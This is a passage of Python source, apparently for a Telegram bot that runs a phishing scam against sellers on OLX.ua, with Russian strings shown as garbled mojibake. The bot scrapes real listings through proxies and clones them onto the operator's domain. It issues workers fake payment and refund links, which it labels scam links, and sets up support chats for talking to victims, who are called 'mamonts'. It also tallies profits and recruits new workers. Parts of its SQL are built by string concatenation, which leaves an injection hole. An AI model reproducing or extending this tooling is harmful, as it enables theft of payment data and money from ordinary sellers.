                    rows = await con.fetch("SELECT worker FROM status WHERE ip = $1;", idmam)
                    # for row in rows:
                    await bot.send_message(cfg.chats[0], 'üìÉ@' + rows[0][0] + "  " + texttoworker)

                await dp.database.release(con)

            except Exception as e:

                await message.reply(e)


@dp.message_handler(state=TestStates.TEST_STATE_1)
async def first_test_state_case_met(message: types.Message):
    if '‚ö´Ô∏è –û—Ç–º–µ–Ω–∏—Ç—å' in message.text:
        state = dp.current_state(user=message.from_user.id)
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ!</b>', parse_mode='HTML')
        return await state.reset_state()
    if (message.text.isdigit()):
        await message.reply(
            '<b>üè¥‚Äç‚ò†Ô∏è –¢—ã –æ—Ç–ø—Ä–∞–≤–∏–ª –º–Ω–µ ID</b> = <code>' + message.text + '</code>\nüè¥‚Äç‚ò†Ô∏è –£–∫–∞–∂–∏ –Ω–æ–≤—É—é —Ü–µ–Ω—É!',
            parse_mode='HTML')
        state = dp.current_state(user=message.from_user.id)
        await state.update_data(priceedit=message.text)
        await state.set_state(TestStates.all()[2])
    else:
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –ù–µ–∫–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —É–∫–∞–∑–∞–Ω–∏–µ id –æ–±—ä—è–≤–ª–µ–Ω–∏—è !</b>', parse_mode='HTML')


@dp.message_handler(state=TestStates.TEST_STATE_2[0])
async def second_test_state_case_met(message: types.Message):
    if '‚ö´Ô∏è –û—Ç–º–µ–Ω–∏—Ç—å' in message.text:
        state = dp.current_state(user=message.from_user.id)
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ!</b>', parse_mode='HTML')
        return await state.reset_state()
    if message.text.isdigit():
        state = dp.current_state(user=message.from_user.id)
        user_data = await state.get_data()
        async with dp.database.acquire() as con:
            rows = await con.fetch("SELECT userr, item FROM links WHERE id = $1", int(user_data['priceedit']))
            if (rows):
                for row in rows:
                    print(row[0] + " ==  " + str(message.from_user.id))
                    if (row[0] == str(message.from_user.id)):

                        await con.execute(
                            f"UPDATE links SET price = $1 WHERE id = $2;", message.text, int(user_data['priceedit']))
                        await dp.database.release(con)

                        await message.reply('<b>[' + str(user_data[
                                                             'priceedit']) + '] –¶–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞</b> = <code>' + message.text + '</code>',
                                            parse_mode='HTML')
                        await state.reset_state()
                    else:
                        await message.reply(
                            '<b>üè¥‚Äç‚ò†Ô∏è –¢—ã –ø—ã—Ç–∞–µ—à—å—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —á—É–∂–æ–º—É –æ–±—ä—è–≤–ª–µ–Ω–∏—é !\nüè¥‚Äç‚ò†Ô∏è –ù–µ –¥–µ–ª–∞–π —Ç–∞–∫!</b>',
                            parse_mode='HTML')
            else:
                await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –ù–µ —Å–º–æ–≥ –Ω–∞–π—Ç–∏ —Ç–∞–∫–æ–µ –æ–±—å—è–≤–ª–µ–Ω–∏–µ</b>', parse_mode='HTML')
        # except Exception as e:
        #     exc_type, exc_obj, exc_tb = sys.exc_info()
        #     fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #     print(exc_type, fname, exc_tb.tb_lineno, e)
        #     await message.reply(
        #         '<b>–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Ü–µ–Ω—ã </b> (–°–æ–æ–±—â–∏—Ç—å @pirate2110)\n <code>' + str(e) + ' ' + str(
        #             exc_tb.tb_lineno) + '</code>', parse_mode='HTML')

        await dp.database.release(con)


    else:
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –ù–µ–∫–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —É–∫–∞–∑–∞–Ω–∞ –Ω–æ–≤–∞—è —Ü–µ–Ω–∞!</b>', parse_mode='HTML')


@dp.message_handler(state=TestStates.TEST_STATE_3)
async def third_or_fourth_test_state_case_met(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    if ('‚ö´Ô∏è –û—Ç–º–µ–Ω–∏—Ç—å' in message.text):
        state = dp.current_state(user=message.from_user.id)
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ!</b>', parse_mode='HTML')
        return await state.reset_state()
    if (message.text.isdigit()):
        try:
            async with dp.database.acquire() as con:

                rows = await con.fetch('SELECT userr FROM links where id = ' + str(message.text))
                if (rows):
                    for row in rows:
                        if (row[0] == str(message.from_user.id)):

                            await con.execute('DELETE FROM links WHERE id = ' + str(message.text))
                            await bot.send_message(message.from_user.id, '‚úÖ –£–¥–∞–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ!')
                            await state.reset_state()

                        else:
                            await bot.send_message(message.from_user.id, '‚õîÔ∏è–¢—ã —á—Ç–æ-—Ç–æ –Ω–∞–ø—É—Ç–∞–ª')
                else:
                    await bot.send_message(message.from_user.id, '‚ö†Ô∏è–ù–µ—Ç –∫–∞–∫–æ–π –æ–±—ä—è–≤—ã')

            await dp.database.release(con)

        except Exception as err:
            print(err)
            await bot.send_message(message.from_user.id, "üè¥‚Äç‚ò†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏–µ." + str(err))
    else:
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –ù–µ–∫–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —É–∫–∞–∑–∞–Ω id –æ–±—ä—è–≤–ª–µ–Ω–∏—è !</b>', parse_mode='HTML')


@dp.message_handler()
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def all_msg_handler(message: types.Message):

    chatMember = await bot.get_chat_member(cfg.chats[0], message.from_user.id)

    sent = False
    blocked = False

    try:

        sent = new_users[message.from_user.id].sent

    except: pass

    try:

        blocked = new_users[message.from_user.id].blocked
    
    except: pass

    if chatMember.status == "left" and message.chat.type == "private" and sent:

        return await message.reply("üè¥‚Äç‚ò†Ô∏è –í—ã —É–∂–µ –ø–æ–¥–∞–ª–∏ –∑–∞—è–≤–∫—É! –û–∂–∏–¥–∞–π—Ç–µ –µ—ë –æ–¥–æ–±—Ä–µ–Ω–∏—è!! üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è")

    if blocked and chatMember.status == "left": return await message.reply("üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–ª–∏ –∏–∑–º–µ–Ω–∏—Ç–µ —Å–≤–æ—é –∑–∞—è–≤–∫—É –ø–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ–º! üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è")
    
    if chatMember.status == "left" and message.from_user.id not in new_users:
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(types.InlineKeyboardButton('–í–æ–π—Ç–∏ –Ω–∞ –ø–∞–ª—É–±—É! ‚ò†Ô∏è', callback_data='new_user'))
        await message.reply("–ü—Ä–∏–≤–µ—Ç, —é–Ω—ã–π –∑–∞—Ö–≤–∞—Ç—á–∏–∫ –ö–∞—Ä–∏–±—Å–∫–∏—Ö –º–æ—Ä–µ–π! üè¥‚Äç‚ò†Ô∏è", reply_markup=keyboard)
        return

    if message.chat.type != "private": return
    button_text = message.text

    if button_text == 'üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É':
        await message.reply("‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—ä—è–≤–ª–µ–Ω–∏–µ!")
    elif button_text == 'üîè –°—Å—ã–ª–∫–∏':
        try:
            links = None
            async with dp.database.acquire() as con:
                links = await con.fetch(
                    f"SELECT link,mainlink,price,tovarN,id,item FROM links WHERE userr = $1;", str(message.from_user.id))
                string = ""
                for row in links:
                    # string += "{0} {1} {2} {3}".format(row[0], row[1], row[2], row[3])
                    # print("{0} {1} {2} {3}".format(row[0], row[1], row[2], row[3]))
                    string += "<b>----------</b><code>[üîë " +\
                              str(row[4]) + "]</code><b>----------</b>\n<b>üè¥‚Äç‚ò†Ô∏è –û–±—ä—è–≤–∞</b>: https://"+ \
                              cfg.domain + '/obyavlenie/?i=' + \
                              row[5] + "\n"
                    string += "üè¥‚Äç‚ò†Ô∏è <b>–û–ø–ª–∞—Ç–∞</b>: https://" + cfg.domain + '?item_id=' + row[5] + "\n"
                    string += "ü§ë <b>–í–æ–∑–≤—Ä–∞—Ç</b>: https://" + cfg.domain + '?item_id=' + row[5] + '&refund' + "\n"
                    string += "üí∞<b>–¶–µ–Ω–∞</b>: <i>" + row[2] + "</i>\n"
                    string += "üìå<b>–ù–∞–∑–≤–∞–Ω–∏–µ</b>: <code>" + row[3] + '</code>\n'

            await dp.database.release(con)

            if len(string) > 4096:
                for x in range(0, len(string), 4096):
                    await bot.send_message(message.from_user.id, string[x:x + 4096], parse_mode='HTML')
            elif len(string) == 0:
                await bot.send_message(message.from_user.id, "‚òπÔ∏è–°–ø–∏—Å–æ–∫ —Å—Å—ã–ª–æ–∫ –¥–ª—è –í–∞—Å –ø—É—Å—Ç")
            else:
                await bot.send_message(message.from_user.id, string, parse_mode='HTML')
        except Exception as e:
            await message.reply('üè¥‚Äç‚ò†Ô∏è –ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å, –ø–æ–ø—Ä–æ–±—É–π —á—É—Ç–æ—á–∫—É –ø–æ–∑–∂–µ' + str(e), parse_mode='HTML')
    elif button_text == '‚ö´Ô∏è –û—Ç–º–µ–Ω–∏—Ç—å':
        await message.reply('üè¥‚Äç‚ò†Ô∏è –ù–µ—á–µ–≥–æ –æ—Ç–º–µ–Ω—è—Ç—å :)', parse_mode='HTML')
    elif button_text == 'üè¥‚Äç‚ò†Ô∏è –ö–∞–±–∏–Ω–µ—Ç' or button_text == '/me':
        async with dp.database.acquire() as con:
            rows = await con.fetch(f"SELECT balance,zaletov FROM workers WHERE userid = $1", str(message.from_user.id))
            string = ''
            string += str(
                message.from_user.mention) + f" ({message.from_user.id})\n"

            ot = "–Ω–∏–∫–æ–≥–æ"

            try:

                ot = str(rows[0][2])

            except: pass
            
            string += "<b>üí∂ –ë–∞–ª–∞–Ω—Å: </b><i>" + str(rows[0][0]) + " ‚Ç¥</i>\n"
            string += "<b>üîù –ó–∞–ª–µ—Ç–æ–≤: </b> " + str(rows[0][1])
        await message.reply(string, parse_mode='HTML')
        await dp.database.release(con)
    elif button_text == '‚≠ê –í—ã–ø–ª–∞—Ç—ã':

        async with dp.database.acquire() as con:

            rows = await con.fetch("SELECT worker,price,date,name FROM zalety WHERE DATE(date) >= CURRENT_DATE AND DATE(date) < CURRENT_DATE + INTERVAL '1 DAY';")
            d2 = datetime.datetime.now()
            string = ""
            allprice = 0

            for row in rows:

                string += f'‚ò†Ô∏è _{hide_name(row[0])}_ - **{row[1]}‚Ç¥**\n'
                allprice += int(row[1])

            await bot.send_message(message.chat.id,
                                '`–°—É–º–º–∞ –≤—Å–µ—Ö –ø—Ä–æ—Ñ–∏—Ç–æ–≤ –Ω–∞ —Å–µ–≥–æ–¥–Ω—è—à–Ω–∏–π –¥–µ–Ω—å —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç ' + str(allprice) + '‚Ç¥\nüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è `\n' + string, parse_mode="markdown")
        
        await dp.database.release(con)

    elif 'olx.ua/obyavlenie/' in button_text or 'olx.ua/obyavlene' in button_text:

        req = 1

        rows = await dp.database.fetch("SELECT * FROM proxys")

        for row in rows:
            proxies = {'https': row[1]+"://"+row[2]+":"+row[3]+"@"+row[4]+":"+row[5]}
            try:
                req = requests.get(button_text, proxies=proxies)
                work = True
                await bot.send_message(message.from_user.id, f"üè¥‚Äç‚ò†Ô∏è –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º!")
                break
            except Exception as e:
                await bot.send_message(message.from_user.id, "proxy "+str(row[0])+": "+str(e))
                await dp.database.execute("DELETE FROM proxys WHERE id = $1", row[0])

        if not rows:

            req = requests.get(button_text)
            work = True
            await bot.send_message(message.from_user.id, f"üè¥‚Äç‚ò†Ô∏è –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º!")
        
        req.encoding = "utf-8"
        folder = button_text.replace("https://www.olx.ua/obyavlenie/", "")
        
        folder = folder.replace("https://olx.ua/obyavlenie/", "")
        folder = folder.replace("https://www.olx.ua/obyavlene/", "")
        folder = folder.replace("https://olx.ua/obyavlene/", "")

        soup = bs(req.content.decode('utf-8'), 'html.parser')
        nameU = soup.find('div', {'class': 'quickcontact__user-name'}).text
        nameU = nameU.replace("   ", "")
        nameU = nameU.replace('''
                ''', "")
        nameU = nameU.replace('''
            ''', "")

        tovarName = soup.find('div', {'class': 'offer-titlebox'}).find('h1').text
        price = soup.find('div', {'class': 'pricelabel'}).find('strong').text
        price = re.sub(" –≥—Ä–Ω.", "", price)
        price = ''.join(price.split())
        imglist = ''
        n = 0
        for a in soup.findAll('img', {'class': 'vmiddle'}):
            if (n == 0):
                imglist += a['src'].split(';')[0]
            else:
                imglist += '|' + a['src'].split(';')[0]
            n += 1

        btnslist = '<li class="offer-details__item"><a href="https://www.olx.ua/elektronika/telefony-i-aksesuary/mobilnye-telefony-smartfony/ananev_42731/?search%5Bprivate_business%5D=private" class="offer-details__param offer-details__param--url" title="–ß–∞—Å—Ç–Ω–æ–≥–æ –ª–∏—Ü–∞ - –ê–Ω–∞–Ω—å–µ–≤"><span class="offer-details__name">–û–±—ä—è–≤–ª–µ–Ω–∏–µ –æ—Ç</span><strong class="offer-details__value">–ß–∞—Å—Ç–Ω–æ–≥–æ –ª–∏—Ü–∞</strong></a></li>'
        for a in soup.findAll('li', {'class': 'offer-details__item'}):
            btnslist += str(a)
        location = soup.find('div', {'class': 'offer-user__address'}).find('address').find('p').text
        description = soup.find('div', {'id': 'textContent'}).text
        tovarName = tovarName.lstrip("\n ")

        json = None

        if "$" in price:

            price = float(price.replace("$", "").strip())
            json = None

            async with aiohttp.ClientSession() as cs:

                resp = await cs.get("https://api.privatbank.ua/p24api/pubinfo?exchange&coursid=5&json")
                json = await resp.json()
            
            price = str(round(float(price) * float(json[0]["buy"])))

        deliver = float(price) * float(0.01)

        my_link = 'https://' + cfg.domain + '/?item_id=' + str(folder)

        id = None

        async with dp.database.acquire() as con:

            try:

                await con.execute(f"INSERT INTO links (userr,mainlink,link,price,tovarn, nameu, worker, item, delivery, image, btn, location, decrip) "
                                        f"VALUES ($1, $2, $3, $4 ,"
                                        f"$5, $6, $7, $8, $9,"
                                        f"$10, $11 , $12, $13);",
                                        str(message.from_user.id), str(button_text), "https://"+cfg.domain+"/obyavlenie/?i="+folder,
                                        price, tovarName, nameU, message.from_user.username, folder, str(deliver), imglist,
                                        btnslist, location, description)

            except Exception as e:

                await message.reply(f"üè¥‚Äç‚ò†Ô∏è –°–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, –≤—ã —É–∂–µ –¥–æ–±–∞–≤–ª—è–ª–∏ —ç—Ç–æ –æ–±—å—è–≤–ª–µ–Ω–∏–µ –≤ –±–æ—Ç–∞. –û—à–∏–±–∫–∞: {e}")



            id = await con.fetchval("SELECT id FROM links WHERE tovarn=$1", tovarName)

        await dp.database.release(con)

        standart_my_link = my_link.replace("–≥—Ä–Ω.", "")
        refund_my_link = my_link.replace("–≥—Ä–Ω.", "") + '&refund'
        await message.reply('üè¥‚Äç‚ò†Ô∏è <b>–û–±—ä—è–≤–ª–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–æ</b> <code>[ID' + str(
            id) + ']: [' + price + '‚Ç¥]\n' + tovarName + '</code>\n\nüîó–°–∫–∞–º-—Å—Å—ã–ª–∫–∞: https://' + cfg.domain + '/obyavlenie/?i=' + str(
            folder) + '\n\nüîó–û–ø–ª–∞—Ç–∞: ' + standart_my_link + '\n\nüîó–í–æ–∑–≤—Ä–∞—Ç: ' + refund_my_link,
                            parse_mode='HTML')

    elif button_text == '‚úíÔ∏è –†–µ–¥–∞–∫—Ç. —Ü–µ–Ω—É':
        state = dp.current_state(user=message.from_user.id)
        await state.reset_state()
        await state.set_state(TestStates.all()[1])
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ ID –æ–±—å—è–≤–ª–µ–Ω–∏—è! üè¥‚Äç‚ò†Ô∏è</b> !', parse_mode='HTML')
    elif button_text == 'üî≤ –£–¥–∞–ª–∏—Ç—å':
        state = dp.current_state(user=message.from_user.id)
        await state.reset_state()
        await state.set_state(TestStates.all()[3])
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏è –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ ID –æ–±—å—è–≤–ª–µ–Ω–∏—è! üè¥‚Äç‚ò†Ô∏è</b> !', parse_mode='HTML')
    elif button_text == 'üÉè –ß–∞—Ç':
        psw = ''  # –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–æ–∑–¥–∞–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é psw
        for x in range(12):
            psw += random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        button = InlineKeyboardButton('üè¥‚Äç‚ò†Ô∏è –ß–∞—Ç –≤–æ—Ä–∫–µ—Ä–∞',
                                      url='https://' + cfg.domain + '/support/?admin&chat_key=' + psw)
        button1 = InlineKeyboardButton('üè¥‚Äç‚ò†Ô∏è –ß–∞—Ç –º–∞–º–æ–Ω—Ç–∞',
                                       url='https://' + cfg.domain + '/support/?chat_key=' + psw)
        inline = InlineKeyboardMarkup().add(button, button1)
        await message.reply(
            '<b>‚ò†Ô∏è –í–û–†–ö–ï–† ‚ò†Ô∏è</b> : https://' + cfg.domain + '/support/?admin&chat_key=' + psw + '\n<b>‚ò†Ô∏è –ú–ê–ú–û–ù–¢ ‚ò†Ô∏è</b> : https://' +
            cfg.domain + '/support/?chat_key=' + psw,
            reply_markup=inline, parse_mode='HTML')

        async with dp.database.acquire() as con:
            await con.execute(
                f"INSERT INTO chats (text,role,chatkey,workerid) VALUES ('–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, —á–µ–º –º—ã –º–æ–∂–µ–º –≤–∞–º –ø–æ–º–æ—á—å?','worker', $1, $2);", psw, str(message.from_user.id))
        await dp.database.release(con)

    elif message.from_user.id in new_users.keys():
        text = ""

        if new_users[message.from_user.id].question == 1:

            new_users[message.from_user.id].where_from = message.text
            text = "üßñ –ö–∞–∫–æ–π –æ–ø—ã—Ç –≤ —Å—Ñ–µ—Ä–µ?"

        elif new_users[message.from_user.id].question == 2:
            new_users[message.from_user.id].experience = message.text
            text = "üïî –°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –≥–æ—Ç–æ–≤ —É–¥–µ–ª—è—Ç—å?"
        elif new_users[message.from_user.id].question == 3:
            new_users[message.from_user.id].time = message.text
            text = "üó£ –ù–∞–ø–∏—à–∏ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –∫ –∑–∞—è–≤–∫–µ!"
        elif new_users[message.from_user.id].question == 4:
            new_users[message.from_user.id].comment = message.text
            new_users[message.from_user.id].form = \
                f'<b>@{new_users[message.from_user.id].username}' \
                f' (<code>{new_users[message.from_user.id].id}</code>):</b>\n' \
                f'<b>üï∂ –£–∑–Ω–∞–ª</b>: {new_users[message.from_user.id].where_from}\n' \
                f'<b>üßñ –û–ø—ã—Ç</b>: {new_users[message.from_user.id].experience}\n' \
                f'<b>üïî –í—Ä–µ–º—è</b>: {new_users[message.from_user.id].time}\n' \
                f'<b>üó£ –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π</b>: {new_users[message.from_user.id].comment}\n'

            m_keyboard = types.InlineKeyboardMarkup(row_width=2)
            text_and_data = (
                ('–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∏—Ä–∞—Ç–∏–∫—É üè¥‚Äç‚ò†Ô∏è', 'send_form'),
                ('–ò–∑–º–µ–Ω–∏—Ç—å –∑–∞—è–≤–∫—É üíÄ', 'new_user'),
            )
            row_btns = (types.InlineKeyboardButton(text, callback_data=data) for text, data in text_and_data)
            m_keyboard.row(*row_btns)

            new_users[message.from_user.id].blocked = True

            await message.reply(new_users[message.from_user.id].form,
                                parse_mode='HTML',
                                reply_markup=m_keyboard)
            text = ""
        new_users[message.from_user.id].question += 1
        if text:
            await message.answer(text)
    else:
        if message.chat.type != "private":
            return
        await message.reply('<b>üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –ù–µ—Ç —Ç–∞–∫–æ–π –ø–∏—Ä–∞—Ç—Å–∫–æ–π –∫–æ–º–∞–Ω–¥—ã üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è</b> !', parse_mode='HTML')


@dp.callback_query_handler(text='new_user')
async def inline_kb_answer_callback_handler(query: types.CallbackQuery):
    new_users[query.from_user.id] = NewUser(query.from_user.id, query.from_user.username)
    await bot.send_message(query.from_user.id, "üï∂ –û—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª –æ –Ω–∞—Å?")


@dp.callback_query_handler(text='send_form')
async def inline_kb_answer_callback_handler(query: types.CallbackQuery):
    for admin in cfg.admins:
        await bot.send_message(admin, new_users[query.from_user.id].form, parse_mode='HTML')

    new_users[query.from_user.id].sent = True

    await bot.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.message_id,
                                text=new_users[query.from_user.id].form + "\n<b>–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!</b>", parse_mode='HTML')
    await bot.send_message(query.from_user.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –û–∂–∏–¥–∞–π—Ç–µ –æ—Ç–≤–µ—Ç–∞ –≥–ª–∞–≤–Ω–æ–≥–æ –ø–∏—Ä–∞—Ç–∞, –≤ —Å–∫–æ—Ä–æ–º –≤—Ä–µ–º–µ–Ω–∏ –≤—ã –±—É–¥–µ—Ç–µ –ø—Ä–∏–Ω—è—Ç—ã üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è")
    

async def shutdown(dispatcher: Dispatcher):
    await dispatcher.storage.close()
    await dispatcher.storage.wait_closed()


if __name__ == '__main__':
    start_polling(dp, loop=loop, skip_updates=True, on_shutdown=shutdown, on_startup=on_startup)
